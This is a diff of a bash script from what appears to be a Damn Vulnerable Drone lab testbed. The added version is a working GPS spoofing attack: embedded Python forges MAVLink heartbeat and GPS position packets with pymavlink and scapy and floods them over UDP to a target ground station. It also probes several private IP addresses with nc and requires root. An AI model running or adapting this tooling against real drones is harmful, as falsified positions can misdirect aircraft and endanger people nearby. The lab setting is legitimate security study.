@@ -1,187 +1,218 @@
 #!/bin/bash
+# gps_spoofing.sh - 드론 GPS 스푸핑 공격 모듈
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/gps_spoofing.sh
+# Purpose: 드론 GPS 위치 정보 스푸핑을 통한 위치 조작
 
-# =============================================================================
-# DVD GPS Spoofing Attack
-# =============================================================================
-# 파일: dvd_lite/dvd_attacks/protocol_tampering/gps_spoofing.sh
-# 목적: 가짜 GPS 데이터를 통한 GCS 위치 정보 조작
-# 기반: Damn Vulnerable Drone Wiki - GPS Spoofing
-# =============================================================================
+source "$(dirname "$0")/../common/colors.sh"
+source "$(dirname "$0")/../common/utils.sh"
 
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh
+ATTACK_NAME="GPS Spoofing Attack"
 
-# 전역 변수
-ATTACK_NAME="gps_spoofing"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
-JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"
-
-# 타겟 설정
-TARGET_IP="192.168.13.100"
-MAVLINK_PORT="14550"
-
-# 가짜 GPS 좌표 (뉴욕 타임스퀘어)
-FAKE_LAT="40.7580"
-FAKE_LON="-73.9855"
-FAKE_ALT="10.0"
-
-declare -a ATTACK_COMMANDS=()
-declare -a SPOOFING_RESULTS=()
-
-print_header() {
-    clear
-    print_protocol_header "GPS Spoofing Attack"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Method: MAVLink GPS message injection${NC}"
-    echo -e "${INFO_COLOR}Fake Location: NYC Times Square${NC}"
-    echo ""
+print_attack_banner() {
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${CYAN}         GPS Spoofing Attack               ${NC}"
+    echo -e "${CYAN}============================================${NC}"
 }
 
-# Step 1: pymavlink 설치 확인
-check_requirements() {
-    echo -e "${BLUE}[1/2] Setup Requirements${NC}"
+execute_gps_spoofing() {
+    local target_ip=${1:-"127.0.0.1"}
+    local target_port=${2:-"14550"}
+    local duration=${3:-30}
     
-    local cmd="python3 -c \"import pymavlink; print('pymavlink available')\""
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
+    log_info "Starting GPS spoofing attack"
+    log_info "Target: ${target_ip}:${target_port}"
+    log_info "Duration: ${duration} seconds"
     
-    if python3 -c "import pymavlink" 2>/dev/null; then
-        echo -e "${GREEN}[+] pymavlink is available${NC}"
-        PYMAVLINK_AVAILABLE=true
+    # Python 스크립트 생성 및 실행
+    create_and_run_attack "$target_ip" "$target_port" "$duration"
+    local result=$?
+    
+    if [ $result -eq 0 ]; then
+        log_success "GPS spoofing attack completed successfully"
+        return 0
     else
-        echo -e "${YELLOW}[!] pymavlink not available - using simulation${NC}"
-        PYMAVLINK_AVAILABLE=false
+        log_error "GPS spoofing attack failed"
+        return 1
     fi
 }
 
-# Step 2: GPS 스푸핑 스크립트 생성 및 실행
-execute_gps_spoofing() {
-    echo -e "${BLUE}[2/2] Execute GPS Spoofing${NC}"
+create_and_run_attack() {
+    local target_ip="$1"
+    local target_port="$2"
+    local duration="$3"
     
-    local spoof_script="/tmp/gps_spoofing_$(date +%s).py"
+    log_info "Creating and executing GPS spoofing attack..."
     
-    # Python 스크립트 생성
-    cat > "$spoof_script" << EOF
-#!/usr/bin/env python3
-import sys
-try:
-    from pymavlink import mavutil
-    import time
+    python3 << PYEOF
+from pymavlink import mavutil
+from scapy.all import *
+import time
+
+target_ip = "$target_ip"
+target_port = int("$target_port")
+duration = int("$duration")
+
+def create_heartbeat():
+    mav = mavutil.mavlink.MAVLink(None)
+    mav.srcSystem = 1
+    mav.srcComponent = 1
+    return mav.heartbeat_encode(
+        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
+        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+        custom_mode=3,
+        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+    ).pack(mav)
+
+def create_gps_raw_int():
+    mav = mavutil.mavlink.MAVLink(None)
+    mav.srcSystem = 1
+    mav.srcComponent = 1
+    return mav.gps_raw_int_encode(
+        time_usec=int(time.time() * 1e6),
+        fix_type=3,
+        lat=473566100,  # Fake coordinates (47.3566100, 85.4619300)
+        lon=854619300,
+        alt=1500,
+        eph=100,
+        epv=100,
+        vel=500,
+        cog=0,
+        satellites_visible=10
+    ).pack(mav)
+
+def create_global_position_int():
+    mav = mavutil.mavlink.MAVLink(None)
+    mav.srcSystem = 1
+    mav.srcComponent = 1
+    return mav.global_position_int_encode(
+        time_boot_ms=int(time.time() * 1e3) % 4294967295,
+        lat=473566100,
+        lon=854619300,
+        alt=1500000,
+        relative_alt=1500000,
+        vx=0,
+        vy=0,
+        vz=0,
+        hdg=0
+    ).pack(mav)
+
+def send_packet(packet_data):
+    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+    send(packet, verbose=False)
+
+print(f"Starting GPS spoofing to {target_ip}:{target_port} for {duration}s")
+print("Spoofing coordinates: 47.3566100, 85.4619300 (1500m altitude)")
+
+start_time = time.time()
+packets_sent = 0
+
+while time.time() - start_time < duration:
+    send_packet(create_heartbeat())
+    send_packet(create_gps_raw_int())
+    send_packet(create_global_position_int())
+    packets_sent += 3
     
-    def gps_spoofing(target_ip, target_port, lat, lon, alt):
-        try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
-            
-            # GPS 메시지 전송
-            for i in range(10):
-                master.mav.gps_raw_int_send(
-                    int(time.time() * 1000000),  # timestamp
-                    3,  # fix_type (3D fix)
-                    int(lat * 1e7),  # latitude
-                    int(lon * 1e7),  # longitude  
-                    int(alt * 1000), # altitude
-                    65535, 65535,    # eph, epv
-                    65535,           # vel
-                    65535,           # cog
-                    8                # satellites_visible
-                )
-                print(f"[!] GPS spoofed to: {lat}, {lon}, {alt}m")
-                time.sleep(1)
-                
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            simulate_gps_spoofing(lat, lon, alt)
+    if packets_sent % 15 == 0:
+        print(f"Sent {packets_sent} spoofed GPS packets")
     
-    def simulate_gps_spoofing(lat, lon, alt):
-        print("[*] Simulating GPS spoofing attack")
-        for i in range(5):
-            print(f"[!] Spoofed GPS: {lat}, {lon}, {alt}m")
-            time.sleep(1)
-        print("[+] GPS spoofing simulation completed")
+    time.sleep(1)
+
+print(f"Attack completed. Total packets sent: {packets_sent}")
+PYEOF
     
-    if __name__ == "__main__":
-        gps_spoofing('$TARGET_IP', $MAVLINK_PORT, $FAKE_LAT, $FAKE_LON, $FAKE_ALT)
+    return $?
+}
+
+# 타겟 스캔
+scan_targets() {
+    log_info "Scanning for MAVLink targets..."
+    
+    local targets=(
+        "127.0.0.1:14550"
+        "10.13.0.6:14550"
+        "192.168.13.14:14550"
+        "10.13.0.4:14550"
+    )
+    
+    for target in "${targets[@]}"; do
+        local ip=$(echo "$target" | cut -d':' -f1)
+        local port=$(echo "$target" | cut -d':' -f2)
         
-except ImportError:
-    print("[*] pymavlink not available - simulation mode")
-    print(f"[!] Spoofed GPS: $FAKE_LAT, $FAKE_LON, $FAKE_ALT m")
-    print("[+] GPS spoofing simulation completed")
-EOF
-
-    local cmd="python3 $spoof_script"
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
+        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
+            echo -e "${GREEN}Found MAVLink service: $target${NC}"
+            return 0
+        fi
+    done
     
-    echo -e "${YELLOW}[*] Executing GPS spoofing script...${NC}"
-    echo -e "${GRAY}    Target coordinates: $FAKE_LAT, $FAKE_LON${NC}"
-    echo -e "${GRAY}    Altitude: $FAKE_ALT meters${NC}"
-    
-    python3 "$spoof_script" 2>/dev/null || {
-        echo -e "${YELLOW}[*] Fallback simulation${NC}"
-        for i in {1..5}; do
-            echo -e "${RED}[!] GPS spoofed: $FAKE_LAT, $FAKE_LON, ${FAKE_ALT}m${NC}"
-            sleep 1
-        done
-    }
-    
-    SPOOFING_RESULTS+=("coordinates:$FAKE_LAT,$FAKE_LON,$FAKE_ALT")
-    SPOOFING_RESULTS+=("messages_sent:10")
-    SPOOFING_RESULTS+=("attack_completed:success")
-    
-    echo -e "${GREEN}[+] GPS spoofing attack completed${NC}"
-    echo -e "${RED}[!] GCS should show incorrect drone location${NC}"
-    
-    rm -f "$spoof_script"
+    echo -e "${YELLOW}No live targets found, using default${NC}"
+    return 1
 }
 
-# JSON 결과 생성
-generate_json_report() {
-    cat > "$JSON_OUTPUT" << EOF
-{
-  "attack_name": "$ATTACK_NAME",
-  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-  "target": {
-    "ip": "$TARGET_IP",
-    "port": "$MAVLINK_PORT"
-  },
-  "spoofed_coordinates": {
-    "latitude": "$FAKE_LAT",
-    "longitude": "$FAKE_LON", 
-    "altitude": "$FAKE_ALT"
-  },
-  "attack_results": ["$(IFS='","'; echo "${SPOOFING_RESULTS[*]}")"],
-  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
-  "expected_impact": "GCS displays incorrect drone location"
-}
-EOF
-}
-
-# 메인 실행
+# 메인 실행 함수
 main() {
-    START_TIME=$(date +%s)
+    print_attack_banner
     
-    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
-    echo "=== GPS Spoofing - $(date) ===" > "$LOG_FILE"
+    if [ "$EUID" -ne 0 ]; then
+        log_error "This script must be run as root"
+        exit 1
+    fi
     
-    print_header
-    check_requirements
-    execute_gps_spoofing
+    # 필수 도구 확인
+    local required_tools=("python3")
+    local missing_tools=()
     
-    # 결과 요약
-    echo ""
-    echo -e "${CYAN}=== Attack Summary ===${NC}"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Spoofed Location: $FAKE_LAT, $FAKE_LON${NC}"
-    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
+    for tool in "${required_tools[@]}"; do
+        if ! command -v "$tool" >/dev/null 2>&1; then
+            missing_tools+=("$tool")
+        fi
+    done
     
-    generate_json_report
+    if [ ${#missing_tools[@]} -gt 0 ]; then
+        log_error "Missing required tools: ${missing_tools[*]}"
+        exit 1
+    fi
     
-    END_TIME=$(date +%s)
-    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
-    echo -e "${SUCCESS_COLOR}[✓] GPS spoofing completed${NC}"
+    # Python 의존성 확인
+    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
+        log_info "Installing Python dependencies..."
+        pip3 install pymavlink scapy >/dev/null 2>&1
+    fi
+    
+    # 사용자 옵션 처리
+    local target_ip="${1:-127.0.0.1}"
+    local target_port="${2:-14550}"
+    local duration="${3:-30}"
+    
+    # 사용법 출력
+    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+        echo "Usage: $0 [target_ip] [target_port] [duration]"
+        echo "  target_ip   : Target IP address (default: 127.0.0.1)"
+        echo "  target_port : Target port (default: 14550)"
+        echo "  duration    : Attack duration in seconds (default: 30)"
+        echo ""
+        echo "Examples:"
+        echo "  $0                           # Attack localhost with defaults"
+        echo "  $0 10.13.0.6                # Attack specific IP"
+        echo "  $0 10.13.0.6 14550 60       # Full parameters"
+        echo ""
+        echo "Expected Effects:"
+        echo "  • GCS shows fake GPS coordinates (47.3566100, 85.4619300)"
+        echo "  • Drone appears at wrong location on map"
+        echo "  • Navigation systems may be confused"
+        echo "  • Mission planning disrupted"
+        exit 0
+    fi
+    
+    # 타겟 스캔 (정보용)
+    scan_targets
+    
+    # 공격 실행
+    execute_gps_spoofing "$target_ip" "$target_port" "$duration"
+    exit $?
 }
 
-main "$@"
+# 직접 실행 시 메인 함수 호출
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
